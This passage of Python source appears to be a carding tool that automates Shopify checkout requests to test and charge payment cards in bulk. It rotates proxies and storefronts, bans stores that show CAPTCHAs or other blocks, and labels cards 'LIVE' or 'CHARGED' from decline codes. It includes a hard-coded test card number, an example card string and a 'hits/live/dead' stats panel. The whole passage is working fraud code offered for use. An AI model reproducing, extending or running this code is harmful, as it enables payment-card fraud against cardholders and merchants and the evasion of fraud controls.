                                            'customOnsitePaymentMethod': None,
                                            'deferredPaymentMethod': None,
                                            'customerCreditCardPaymentMethod': None,
                                            'paypalBillingAgreementPaymentMethod': None,
                                        },
                                        'amount': {
                                            'any': True,
                                        },
                                        'dueAt': None,
                                    },
                                ],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': add1,
                                        'address2': '',
                                        'city': city,
                                        'countryCode': 'US',
                                        'postalCode': zip_code,
                                        'company': '',
                                        'firstName': fname,
                                        'lastName': lname,
                                        'zoneCode': state_short,
                                        'phone': phone,
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {
                                    'presentmentCurrency': 'USD',
                                    'countryCode': 'US',
                                },
                                'contactInfoV2': {
                                    'emailOrSms': {
                                        'value': email,
                                        'emailOrSmsChanged': False,
                                    },
                                },
                                'marketingConsent': [
                                    {
                                        'email': {
                                            'value': email,
                                        },
                                    },
                                ],
                                'shopPayOptInPhone': {
                                    'countryCode': 'US',
                                },
                            },
                            'tip': {
                                'tipLines': [],
                            },
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {
                                    'value': {
                                        'amount': '0',
                                        'currencyCode': 'USD',
                                    },
                                },
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': [],
                            },
                            'note': {
                                'message': None,
                                'customAttributes': [],
                            },
                            'localizationExtension': {
                                'fields': [],
                            },
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None,
                                'signatureUuid': None,
                                'lineItemScriptChanges': [],
                                'paymentScriptChanges': [],
                                'shippingScriptChanges': [],
                            },
                            'optionalDuties': {
                                'buyerRefusesDuties': False,
                            },
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'metafields': [],
                        'analytics': {
                            'requestUrl': f'{site_url}/checkouts/cn/{token}',
                            'pageId': random_page_id,
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }

                response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                print(f"📡 GraphQL Response Status: {response.status_code}")

                if response.status_code != 200:
                    return f"❌ GraphQL request failed: {response.status_code}"

                result_data = response.json()
                print(f"📡 GraphQL Response: {json.dumps(result_data, indent=2)[:1000]}...")

                receipt_id = None
                has_errors = False
                error_codes = []

                if 'data' in result_data and result_data['data']:
                    completion = result_data['data'].get('submitForCompletion', {})

                    if 'receipt' in completion and completion['receipt']:
                        receipt_id = completion['receipt'].get('id')
                        print(f"✅ Receipt ID extracted from receipt field: {receipt_id}")

                    if completion.get('__typename') == 'Throttled':
                        print("⏳ Throttled response detected - payment is being processed...")
                        throttle_queue = completion.get('queueToken')
                        if throttle_queue:
                            print(f"✅ Throttle queue token: {throttle_queue[:20]}...")

                    if 'errors' in completion and completion['errors']:
                        has_errors = True
                        errors = completion['errors']
                        error_codes = [e.get('code') for e in errors if 'code' in e]
                        print(f"⚠️ Errors returned: {error_codes}")

                        if 'WAITING_PENDING_TERMS' in error_codes:
                            print("⏳ WAITING_PENDING_TERMS detected - attempting to proceed with checkout validation...")
                            has_errors = False

                        # Handle delivery/payment errors - these are legitimate responses, not dead sites
                        non_pending_errors = [e for e in error_codes if e != 'WAITING_PENDING_TERMS']
                        if non_pending_errors:
                            # Check if these are legitimate Shopify responses that should go to challenge.txt
                            challenge_errors = ['DELIVERY_DELIVERY_LINE_DETAIL_CHANGED', 'DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION',
                                              'REQUIRED_ARTIFACTS_UNAVAILABLE', 'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH',
                                              'PAYMENTS_CREDIT_CARD_BASE_EXPIRED', 'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
                                              'DELIVERY_ADDRESS2_REQUIRED', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
                                              'PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE', 'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
                                              'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'PAYMENTS_METHOD']
                            
                            if any(e in challenge_errors for e in non_pending_errors):
                                print(f"🚫 Dead site detected via response: {non_pending_errors}")
                                error_msg = ', '.join(non_pending_errors)
                                # Permanently ban the site so it's never used again
                                GLOBAL_STATE.ban_site_permanently(site_url, f"Dead site response: {error_msg}")
                                return f"❌ DEAD SITE BAN: {error_msg}"
                            else:
                                error_msg = ', '.join(non_pending_errors)
                                return f"❌ Payment Rejected: {error_msg}"

                    if completion.get('reason'):
                        return f"❌ Payment Failed: {completion['reason']}"

                if not receipt_id and not has_errors:
                    print("⚠️ No receipt ID found in initial response, checking alternative locations...")
                    if 'data' in result_data:
                        submit_data = result_data['data'].get('submitForCompletion')
                        if isinstance(submit_data, dict):
                            receipt_id = submit_data.get('id')
                            if receipt_id:
                                print(f"✅ Receipt ID extracted from alternative location: {receipt_id}")

                if not receipt_id and 'WAITING_PENDING_TERMS' in error_codes:
                    print("⏳ WAITING_PENDING_TERMS without receipt - attempting second submission...")
                    await asyncio.sleep(2)

                    graphql_payload['variables']['attemptToken'] = f'{token}-{random.random()}'

                    response2 = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                    if response2.status_code == 200:
                        result_data2 = response2.json()
                        print(f"📡 Second Attempt Response: {json.dumps(result_data2, indent=2)[:800]}...")

                        if 'data' in result_data2 and result_data2['data']:
                            completion2 = result_data2['data'].get('submitForCompletion', {})
                            if 'receipt' in completion2 and completion2['receipt']:
                                receipt_id = completion2['receipt'].get('id')
                                if receipt_id:
                                    print(f"✅ Receipt ID extracted from second attempt: {receipt_id}")

                if receipt_id:
                    print(f"\n⏳ STEP 7: Polling for receipt status (Receipt ID: {receipt_id})...")

                    poll_payload = {
                        'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}',
                        'variables': {
                            'receiptId': receipt_id,
                            'sessionToken': tokens['x_checkout_one_session_token'],
                        },
                        'operationName': 'PollForReceipt'
                    }

                    max_polls = 7
                    for poll_attempt in range(max_polls):
                        await asyncio.sleep(2.5)

                        print(f"🔍 Poll attempt {poll_attempt + 1}/{max_polls}...")
                        poll_response = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)

                        if poll_response.status_code == 200:
                            poll_data = poll_response.json()
                            print(f"📡 Poll Response: {json.dumps(poll_data, indent=2)[:800]}...")

                            if 'data' in poll_data and 'receipt' in poll_data['data']:
                                receipt = poll_data['data']['receipt']

                                if receipt.get('__typename') == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                                    order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                                    order_token = receipt.get('token', 'N/A')
                                    redirect_url = receipt.get('redirectUrl', '')

                                    print(f"✅ Payment SUCCESSFUL! Order confirmed!")
                                    print(f"   Order ID: {order_id}")
                                    print(f"   Token: {order_token}")
                                    if redirect_url:
                                        print(f"   Redirect: {redirect_url}")

                                    return f"✅ CARD CHARGED! ORDER PLACED! 💰🔥\nOrder ID: {order_id}\nToken: {order_token}"

                                elif receipt.get('__typename') == 'ProcessingReceipt':
                                    poll_delay = receipt.get('pollDelay', 3000) / 1000
                                    print(f"⏳ Still processing, waiting {poll_delay}s...")
                                    await asyncio.sleep(poll_delay)
                                    continue

                                elif receipt.get('__typename') == 'ActionRequiredReceipt':
                                    print(f"⚠️ ActionRequiredReceipt detected (3D Secure) - Checking final order status...")
                                    action_required_3ds = True
                                    break

                                elif receipt.get('__typename') == 'FailedReceipt':
                                    processing_error = receipt.get('processingError', {})
                                    error_code = processing_error.get('code', 'Unknown')
                                    error_msg = processing_error.get('messageUntranslated', '')
                                    error_type = processing_error.get('__typename', 'Unknown')

                                    print(f"🔍 Shopify Error - Code: {error_code}, Message: {error_msg}, Type: {error_type}")

                                    if error_code == 'INSUFFICIENT_FUNDS':
                                        return f"✅ Card LIVE - Insufficient Funds (CVV Matched)"

                                    elif error_code in ['INCORRECT_CVC', 'INVALID_CVC']:
                                        return f"✅ Card LIVE - Invalid CVV (Card Valid, Wrong CVV)"

                                    elif error_code in ['EXPIRED_PAYMENT_METHOD', 'EXPIRED_CARD']:
                                        return f"❌ Card DECLINED - Expired Card"

                                    elif error_code in ['CARD_NUMBER_INCORRECT', 'INCORRECT_NUMBER']:
                                        return f"❌ Card DECLINED - Invalid Card Number"

                                    elif error_code == 'FRAUD_SUSPECTED':
                                        return f"❌ Card DECLINED - Fraud/Security Block"

                                    elif error_code == 'PAYMENT_METHOD_DECLINED':
                                        return f"❌ Card DECLINED - Payment Method Declined"

                                    elif error_code == 'INVALID_PAYMENT_METHOD':
                                        return f"❌ Card DECLINED - Invalid Payment Method"

                                    elif error_code == 'TRANSIENT_ERROR':
                                        return f"⚠️ Try Again - Temporary Network Error"

                                    elif error_code == 'AUTHENTICATION_ERROR':
                                        return f"✅ Card LIVE - Authentication Required (3DS/Verification)"

                                    elif error_code == 'CAPTCHA_REQUIRED':
                                        return f"🔐 CAPTCHA_REQUIRED - Card passed validation but needs verification"

                                    elif error_code == 'PAYMENTS_CREDIT_CARD_BASE_EXPIRED':
                                        return f"🔐 PAYMENTS_CREDIT_CARD_BASE_EXPIRED - Card needs revalidation"

                                    elif error_code == 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED':
                                        return f"🔐 DELIVERY_DELIVERY_LINE_DETAIL_CHANGED - Shipping validation needed"

                                    elif error_code == 'DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION':
                                        return f"🔐 DELIVERY_OUT_OF_STOCK - Inventory issue at location"

                                    elif error_code == 'REQUIRED_ARTIFACTS_UNAVAILABLE':
                                        return f"🔐 REQUIRED_ARTIFACTS_UNAVAILABLE - Missing required documents"

                                    elif error_code == 'PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH':
                                        return f"🔐 PAYMENTS_FLEXIBILITY_TERMS - Payment terms mismatch"

                                    elif error_code == 'BUYER_CANCELED_PAYMENT_METHOD':
                                        return f"⚠️ Payment Canceled by User"

                                    elif error_code in ['CUSTOMER_INVALID', 'CUSTOMER_NOT_FOUND']:
                                        return f"❌ Error - Invalid Customer Data"

                                    elif error_code == 'INSUFFICIENT_INVENTORY':
                                        return f"⚠️ Error - Insufficient Inventory"

                                    elif error_code == 'AMOUNT_TOO_SMALL':
                                        return f"⚠️ Error - Amount Too Small"

                                    elif error_code == 'PURCHASE_TYPE_NOT_SUPPORTED':
                                        return f"❌ Error - Purchase Type Not Supported"

                                    elif error_code == 'PAYPAL_ERROR':
                                        return f"❌ PayPal Error"

                                    elif error_code == 'UNEXPECTED_ERROR':
                                        return f"❌ Unexpected Error - Try Again"

                                    elif error_code == 'CARD_DECLINED':
                                        print(f"⚠️ Generic CARD_DECLINED - Will check final page for specific reason...")
                                        error_codes.append('CARD_DECLINED')
                                        break
                                        # Will continue to check final page for specific decline reason

                                    elif error_code == 'PROCESSING_ERROR':
                                        return f"❌ Processing Error - Gateway Issue"

                                    elif error_code and error_code != 'Unknown':
                                        decline_reason = error_msg if error_msg and len(error_msg) > 3 else error_code
                                        return f"❌ Card DECLINED\nReason: {decline_reason}\nType: {error_type}"
                                    else:
                                        print(f"⚠️ Unknown error - Will check final page...")
                                        break

                    print("⏳ Max polls reached, checking final page...")

                print("\n🔍 STEP 8: Checking final payment result...")

                if 'WAITING_PENDING_TERMS' in error_codes:
                    print("⏳ Attempting direct checkout verification for WAITING_PENDING_TERMS...")
                    await asyncio.sleep(2)

                checkout_url_final = f"{checkout_url}?from_processing_page=1&validate=true"
                final_headers = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'referer': f"{site_url}/checkout",
                    'user-agent': self.ua.random,
                }

                final_response = await session.get(checkout_url_final, headers=final_headers, follow_redirects=True)
                final_text = final_response.text or ""
                final_url = str(final_response.url)

                print(f"📍 Final URL: {final_url}")

                if not final_text:
                    print("⚠️ Warning: Final response is empty")
                    if action_required_3ds:
                        return f"✅ Card LIVE! (Action required - 3D Secure)"
                    return f"⚠️ Empty response - Cannot determine card status"

                if action_required_3ds:
                    print("🔍 3D Secure detected - Checking if payment succeeded...")

                    strict_decline_phrases = [
                        "card was declined", "card has been declined", "card declined",
                        "payment could not be processed", "payment failed", "payment was declined",
                        "transaction declined", "transaction failed", "charge failed",
                        "card rejected", "payment method declined", "invalid card",
                        "insufficient funds", "expired", "incorrect number"
                    ]
                    has_strict_decline = any(phrase in final_text.lower() for phrase in strict_decline_phrases)

                    if not has_strict_decline:
                        print(f"✅ 3D Secure - Card is LIVE! No decline errors found")
                        return f"✅ Card LIVE! (Action required - 3D Secure)"
                    else:
                        print(f"⚠️ 3D Secure but found decline phrases - checking error type...")

                success_url_patterns = [
                    "/thank", "/orders/", "/receipt", "/thank_you", "thank-you",
                    "/order-status", "/order_status", "/confirmation",
                    "/merci", "/gracias", "/danke", "/obrigado", "/grazie",
                    "/checkouts/thank", "/post_purchase", "/success", "/completed",
                    "/order-confirmed", "/order_confirmed", "/checkout-complete",
                    "/order-complete", "/purchase-complete", "/payment-success",
                    "/order_complete", "/purchase_complete", "/thankyou",
                    "/confirmation_page", "/order_confirmation", "/checkout_success",
                    "/payment_complete", "/payment-complete", "/order_success",
                    "order_id=", "order-id=", "transaction=", "receipt_id="
                ]

                if any(pattern in final_url.lower() for pattern in ["order_placed", "thank_you", "orders/", "thank-you", "thankyou"]):
                    # Check for test mode - if site is in test mode, it's not a real charge
                    if "test mode" in final_text.lower() or "bogus" in final_text.lower() or "test-mode" in final_text.lower():
                        return {"status": "success", "message": "APPROVED ✅ (Test Mode Detected)", "price": final_price, "site": site_url}
                    
                    # Robust success verification: must have success indicators and NO decline signals
                    actual_success_indicators = ["thank you", "confirmed", "order #", "order number", "receipt", "success"]
                    has_actual_success_text = any(phrase in final_text.lower() for phrase in actual_success_indicators)
                    
                    decline_signals = ["card was declined", "payment failed", "card has been declined", "transaction declined", "rejected"]
                    has_decline_signals = any(signal in final_text.lower() for signal in decline_signals)

                    if has_actual_success_text and not has_decline_signals:
                        return {"status": "success", "message": "CHARGED 💰 (ORDER PLACED)", "price": final_price, "site": site_url}
                    else:
                        print(f"⚠️ URL suggests success but page content fails validation - treating as DECLINED")
                        return {"status": "declined", "message": "DECLINED ❌ (Validation Failed)", "price": final_price, "site": site_url}

                if "processing" in final_url or "post_checkout" in final_url:
                     return {"status": "success", "message": "LIVE ✅ (PROCESSING)", "price": final_price, "site": site_url}

                # Handle specific Shopify error codes/messages
                if "inventory_out_of_stock" in final_text or "out of stock" in final_text.lower():
                     return {"status": "error", "message": "OUT OF STOCK ❌", "price": final_price, "site": site_url}

                if "captcha_required" in final_text.lower() or "challenge" in final_url or "google.com/recaptcha" in final_text:
                    GLOBAL_STATE.ban_site_permanently(site_url, "CAPTCHA Required")
                    return {"status": "error", "message": "CAPTCHA REQUIRED ❌ (Site Banned)", "price": final_price, "site": site_url}

                if "card_declined" in final_text or "declined" in final_text.lower():
                    return {"status": "declined", "message": "DECLINED ❌", "price": final_price, "site": site_url}

                if "expired" in final_text.lower():
                     return {"status": "declined", "message": "EXPIRED CARD ❌", "price": final_price, "site": site_url}

                return {"status": "unknown", "message": f"UNKNOWN ⚠️ ({final_url})", "price": final_price, "site": site_url}

                decline_signals = [
                    "card was declined", "payment could not be processed", "payment failed",
                    "card has been declined", "unable to process", "transaction declined",
                    "We couldn't verify", "verification failed", "authentication failed",
                    "payment was not successful", "unsuccessful", "not authorized",
                    "cannot be processed", "processing failed", "charge failed",
                    "card rejected", "card not accepted", "invalid payment",
                    "transaction was declined", "payment was declined", "card was rejected",
                    "payment authorization failed", "authorization failed", "not approved",
                    "could not authorize", "authorization unsuccessful", "declined by issuer",
                    "issuer declined", "bank declined", "payment method declined",
                    "do not honor", "restricted card", "generic decline"
                ]
                has_decline_signals = any(signal in final_text.lower() for signal in decline_signals)

                risky_signals = ["risky", "fraud", "high risk", "suspected fraud", "fraud detection"]
                has_risky_signals = any(signal in final_text.lower() for signal in risky_signals)

                if has_risky_signals:
                    print(f"⚠️ RISKY card detected - fraud/risk filters triggered")
                    return f"❌ Card DECLINED\nReason: RISKY\nType: PaymentFailed"

                if not has_decline_signals:
                    success_count = 0

                    english_success = ["Thank you", "order is confirmed", "Thank you for your purchase", "Thanks for your order", 
                                      "Order confirmed", "Order received", "Order successfully placed"]
                    spanish_success = ["Gracias por tu pedido", "Pedido confirmado", "Gracias por su compra", "Tu pedido"]
                    french_success = ["Merci pour votre commande", "Commande confirmée", "Merci pour votre achat"]
                    german_success = ["Vielen Dank", "Bestellung bestätigt", "Danke für Ihre Bestellung"]
                    italian_success = ["Grazie per il tuo ordine", "Ordine confermato", "Grazie per l'acquisto"]
                    portuguese_success = ["Obrigado pelo seu pedido", "Pedido confirmado", "Obrigado pela compra"]

                    all_thank_patterns = english_success + spanish_success + french_success + german_success + italian_success + portuguese_success
                    if any(pattern in final_text for pattern in all_thank_patterns):
                        success_count += 1
                        print(f"✅ Success indicator: Thank you message found")

                    payment_success = ["payment was processed", "successfully placed", "payment successful", "Payment accepted", 
                                      "successfully processed", "payment complete", "payment went through", "transaction approved",
                                      "successfully authorized", "authorized successfully"]
                    if any(pattern in final_text for pattern in payment_success):
                        success_count += 1
                        print(f"✅ Success indicator: Payment processed message found")

                    order_success = ["order has been placed", "order has been received", "We've received your order", 
                                    "Your order is complete", "Purchase complete", "order is being processed",
                                    "order submitted successfully", "successfully submitted"]
                    if any(pattern in final_text for pattern in order_success):
                        success_count += 1
                        print(f"✅ Success indicator: Order placement message found")

                    number_patterns = ["confirmation number", "order number", "order complete", "Order #", "receipt number", 
                                      "transaction successful", "transaction id", "confirmation code", "reference number",
                                      "tracking number"]
                    if any(pattern in final_text for pattern in number_patterns):
                        success_count += 1
                        print(f"✅ Success indicator: Order/confirmation number found")

                    charge_patterns = ["charged successfully", "payment confirmed", "successfully charged", "transaction complete", 
                                      "purchase successful", "charge successful", "payment authorized", "card charged",
                                      "successfully billed", "billing successful"]
                    if any(pattern in final_text for pattern in charge_patterns):
                        success_count += 1
                        print(f"✅ Success indicator: Charge confirmation found")

                    order_id_match = re.search(r'order[_\s#-]*(\d{10,})', final_text, re.IGNORECASE)
                    if order_id_match:
                        success_count += 1
                        print(f"✅ Success indicator: Order ID pattern found: {order_id_match.group(1)}")

                    json_success_patterns = [
                        r'"status"\s*:\s*"(?:success|completed|confirmed|paid)"',
                        r'"order_status"\s*:\s*"(?:success|completed|confirmed|paid)"',
                        r'"payment_status"\s*:\s*"(?:success|completed|confirmed|paid|authorized)"',
                        r'"financial_status"\s*:\s*"(?:paid|authorized|pending)"'
                    ]
                    for pattern in json_success_patterns:
                        if re.search(pattern, final_text, re.IGNORECASE):
                            success_count += 1
                            print(f"✅ Success indicator: JSON status field indicates success")
                            break

                    if success_count >= 1:
                        print(f"✅ ORDER CONFIRMED! {success_count} success indicator(s) detected, NO decline signals")
                        return f"✅ CARD CHARGED! ORDER PLACED! 💰🔥"

                elif "security code" in final_text.lower() and ("incorrect" in final_text.lower() or "not matched" in final_text.lower() or "invalid" in final_text.lower()):
                    return f"✅ Card LIVE - Invalid CVV (Card Valid, Wrong CVV)"

                elif "zip" in final_text.lower() and ("doesn't match" in final_text.lower() or "mismatch" in final_text.lower() or "incorrect" in final_text.lower()):
                    return f"✅ Card LIVE - AVS Failed (Card Valid, Address Mismatch)"

                elif "insufficient funds" in final_text.lower():
                    return f"✅ Card LIVE - Insufficient Funds (CVV Matched)"

                elif "expired" in final_text.lower() and "card" in final_text.lower():
                    return f"❌ Card DECLINED - Expired Card"

                elif "card was declined" in final_text.lower() or "payment could not be processed" in final_text.lower():
                    error_msg = find_between(final_text, 'notice__text">', '</p>')
                    if not error_msg:
                        error_msg = find_between(final_text, 'class="notice__text">', '</p>')
                    if not error_msg:
                        error_msg = find_between(final_text, 'error-message">', '</div>')
                    if not error_msg:
                        error_msg = find_between(final_text, 'class="error">', '</p>')
                    
                    final_error = error_msg.strip() if error_msg else "Payment failed"
                    return f"❌ Card DECLINED\nReason: {final_error}"

                else:
                    if 'WAITING_PENDING_TERMS' in error_codes:
                        return f"⚠️ WAITING_PENDING_TERMS - Payment may be processing\nPlease check manually: {checkout_url}\nThis error typically means terms need to be accepted on the store."
                    return f"⚠️ Unknown Status - Manual check needed\nCheckout URL: {checkout_url}"

            except Exception as e:
                return f"❌ Error: {str(e)}"

class ShopifyChecker:
    def __init__(self, proxy=None):
        self.auto = ShopifyAuto()
        self.proxy = proxy
        self.last_price = None

    async def check_card(self, site_url, card_num, month, year, cvv):
        card_info = f"{card_num}|{month}|{year}|{cvv}"
        result = await self.auto.auto_shopify_charge(site_url, card_info, proxy=self.proxy)

        return {
            'message': result,
            'price': self.auto.last_price if hasattr(self.auto, 'last_price') else None
        }

async def process_single_card(card_info: str, max_retries: int = 3) -> Dict:
    """Process single card with site rotation"""
    retry_count = 0
    site_errors = []

    while retry_count < max_retries:
        site = GLOBAL_STATE.get_next_site()
        if not site:
            return {
                'status': 'error',
                'message': '❌ No sites available for rotation',
                'price': None,
                'card': card_info,
                'site': None
            }

        proxy = GLOBAL_STATE.get_next_proxy()

        try:
            checker = ShopifyChecker(proxy=proxy)
            result = await checker.check_card(
                site_url=site,
                card_num=card_info.split('|')[0],
                month=card_info.split('|')[1],
                year=card_info.split('|')[2],
                cvv=card_info.split('|')[3]
            )

            # Update stats
            result_msg = result['message']
            if "✅" in result_msg or "CHARGED" in result_msg or "ORDER PLACED" in result_msg:
                GLOBAL_STATE.update_stats('charged', card_info, result['price'])
            elif "LIVE" in result_msg or "APPROVED" in result_msg:
                GLOBAL_STATE.update_stats('approved', card_info, result['price'])
            elif "DECLINED" in result_msg:
                GLOBAL_STATE.update_stats('declined', card_info, result['price'])
            else:
                GLOBAL_STATE.update_stats('error', card_info, result['price'])

            return {
                'status': 'success',
                'message': result['message'],
                'price': result['price'],
                'card': card_info,
                'site': site,
                'proxy_used': bool(proxy)
            }

        except Exception as e:
            site_errors.append(f"{site}: {str(e)}")
            GLOBAL_STATE.mark_site_unavailable(site)
            retry_count += 1
            GLOBAL_STATE.update_stats('retry')
            await asyncio.sleep(1)

    return {
        'status': 'error',
        'message': f'❌ Failed after {max_retries} retries\nSite errors: {", ".join(site_errors)}',
        'price': None,
        'card': card_info,
        'site': None,
        'proxy_used': False
    }

async def mass_check_sites(sites: List[str]) -> Tuple[List[str], List[str]]:
    """Mass check Shopify sites using test CC"""
    working_sites = []
    non_working_sites = []
    test_cc = "4520340107950985|09|2029|911"

    for site in sites:
        if not site.startswith('http'):
            site = f'https://{site}'

        try:
            auto = ShopifyAuto()
            proxy = GLOBAL_STATE.get_next_proxy()
            if not proxy:
                proxy = "http://no-proxy"  # Fallback if no proxy available

            is_shopify, price, product = await auto.test_site_shopify(site, proxy)

            if is_shopify:
                working_sites.append(f"Site: {site}\nPrice: {price}\nProduct: {product}")
            else:
                non_working_sites.append(f"Site: {site}\nError: {price}\nStatus: {product}")

        except Exception as e:
            non_working_sites.append(f"Site: {site}\nError: {str(e)[:100]}")

        await asyncio.sleep(1)

    return working_sites, non_working_sites

def format_stats_response() -> str:
    """Format statistics for display"""
    stats = GLOBAL_STATE.stats
    elapsed_time = time.time() - stats['start_time']

    # Calculate progress bar
    total = stats['total_checks']
    if total == 0:
        progress_bar = "[□□□□□□□□□□]"
        progress_percent = 0
    else:
        progress_filled = min(10, int((stats['approved'] + stats['charged'] + stats['declined']) / total * 10))
        progress_bar = "█" * progress_filled + "□" * (10 - progress_filled)
        progress_percent = (stats['approved'] + stats['charged'] + stats['declined']) / total * 100

    # Calculate CPM
    minutes = elapsed_time / 60
    cpm = stats['total_checks'] / minutes if minutes > 0 else 0

    response = f"""
⚡💠 𝑺𝒕𝒂𝒕𝒖𝒔: {'✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱' if stats['total_checks'] > 0 else '⏳ 𝗣𝗲𝗻𝗱𝗶𝗻𝗴'}
━━━━━━━ 𝑺𝑻𝑨𝑻𝑺 ━━━━━━━
📊 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔: {stats['total_checks']} [{progress_bar}] {progress_percent:.1f}%
✅ 𝑯𝒊𝒕𝒔: {stats['charged']} | ❎ 𝑳𝒊𝒗𝒆: {stats['approved']}
❌ 𝑫𝒆𝒂𝒅: {stats['declined']} | ⚠️ 𝑬𝒓𝒓𝒐𝒓𝒔: {stats['errors']}
━━━━━ 𝑷𝑬𝑹𝑭𝑶𝑹𝑴𝑨𝑵𝑪𝑬 ━━━━━
⚡ 𝑪𝑷𝑴: {cpm:.1f} cards/min
⏱️ 𝑨𝒗𝒈 𝑻𝒊𝒎𝒆: {elapsed_time/stats['total_checks']:.2f}s | 🔄 𝑹𝒆𝒕𝒓𝒊𝒆𝒔: {stats['retries']}
━━━━━━━━ 𝑺𝑰𝑻𝑬𝑺 ━━━━━━━━
🌐 𝑼𝒔𝒂𝒃𝒍𝒆: {len(GLOBAL_STATE.available_sites)} | 🚫 𝑩𝒂𝒏𝒏𝒆𝒅: {len(GLOBAL_STATE.unavailable_sites)}
━━━━━━ 𝑳𝑨𝑺𝑻 𝑪𝑯𝑬𝑪𝑲 ━━━━━━
💳 𝑪𝒂𝒓𝒅: {stats['last_card'] or 'N/A'}
📌 𝑹𝒆𝒔𝒖𝒍𝒕: {stats['last_result'] or 'N/A'} | 💲 {stats['last_price'] or 'N/A'}
━━━━━━━━━━━━━━━━━━━━━━━
🔌 𝑷𝒓𝒐𝒙𝒚 𝑺𝒕𝒂𝒕𝒖𝒔: {stats['proxy_status']}
"""

    return response

# Standalone CLI functions for testing
async def cli_single_check():
    """CLI for single card check"""
    print("\n" + "="*50)
    print("🛍️  Shopify Single Card Checker")
    print("="*50)

    site = input("\nEnter Shopify site URL (or press Enter for rotation): ").strip()
    if not site:
        site = GLOBAL_STATE.get_next_site()
        if not site:
            print("❌ No sites available in rotation!")
            return

    card_info = input("Enter card info (number|month|year|cvv): ").strip()
    if not card_info:
        print("❌ Card info required!")
        return

    if not re.match(r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', card_info):
        print("❌ Invalid card format. Use: 5262255312963855|08|2029|734")
        return

    proxy = GLOBAL_STATE.get_next_proxy()
    if proxy:
        print(f"🔌 Using proxy: {proxy[:50]}...")

    bot = ShopifyAuto()
    result = await bot.auto_shopify_charge(site, card_info, proxy)

    print(f"\n🎯 Final Result: {result}")

async def process_card_worker(card_index, card, use_rotation, site, file_handles, stats_lock, stats, dead_sites_lock, site_usage=None):
    """Worker function to process a single card with smart site rotation (max 3 uses per site)"""
    if site_usage is None:
        site_usage = {}
    
    print(f"\n🔍 Card {card_index}: {card[:8]}****")
    
    # For each card, try different sites until we get a valid response
    card_result = None
    is_valid = False
    max_site_retries = 5
    site_tries = 0
    current_site = None
    max_uses_per_site = 3  # Max 3 uses per site before rotating
    
    while not is_valid and site_tries < max_site_retries:
        site_tries += 1
        
        # Get site with smart rotation
        if use_rotation:
            current_site = GLOBAL_STATE.get_next_site()
            if not current_site:
                print(f"   ❌ No sites available in rotation! (Attempt {site_tries}/{max_site_retries})")
                break
            
            # Check if this site has been used too many times
            site_usage_count = site_usage.get(current_site, 0)
            
            # If site has been used max times, skip to next site
            attempts_to_find_new_site = 0
            while site_usage_count >= max_uses_per_site and attempts_to_find_new_site < 10:
                print(f"   ⏭️ Site used {site_usage_count}/{max_uses_per_site} times, rotating...")
                current_site = GLOBAL_STATE.get_next_site()
                if not current_site:
                    print(f"   ❌ No more sites available!")
                    break
                site_usage_count = site_usage.get(current_site, 0)
                attempts_to_find_new_site += 1
        else:
            current_site = site
        
        if not current_site:
            print(f"   ❌ No site available (Attempt {site_tries}/{max_site_retries})")
            continue
        
        proxy = GLOBAL_STATE.get_next_proxy()
        bot = ShopifyAuto()
        
        print(f"   🏪 Attempt {site_tries}/{max_site_retries}: {current_site[:50]}... (Used: {site_usage.get(current_site, 0)}/3)")
        result = await bot.auto_shopify_charge(current_site, card, proxy)
        
        # Check if result is DEAD SITE error (not legitimate Shopify response)
        is_dead_site = (not result or 
                   "Error" in result or "error" in result or
                   "Failed" in result or "failed" in result or
                   "404" in result or "422" in result or "429" in result or "400" in result or "500" in result or "503" in result or
                   "Connection" in result or "Timeout" in result or "timeout" in result or
                   "SHIPPING UNAVAILABLE" in result or
                   "CAPTCHA_REQUIRED" in result or
                   "DEAD SITE BAN" in result or
                   "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in result or
                   "DELIVERY_OUT_OF_STOCK_AT_ORIGIN_LOCATION" in result or
                   "REQUIRED_ARTIFACTS_UNAVAILABLE" in result or
                   "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH" in result or
                   "PAYMENTS_CREDIT_CARD_BASE_EXPIRED" in result or
                   "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in result or
                   "DELIVERY_ADDRESS2_REQUIRED" in result or
                   "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE" in result or
                   "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE" in result or
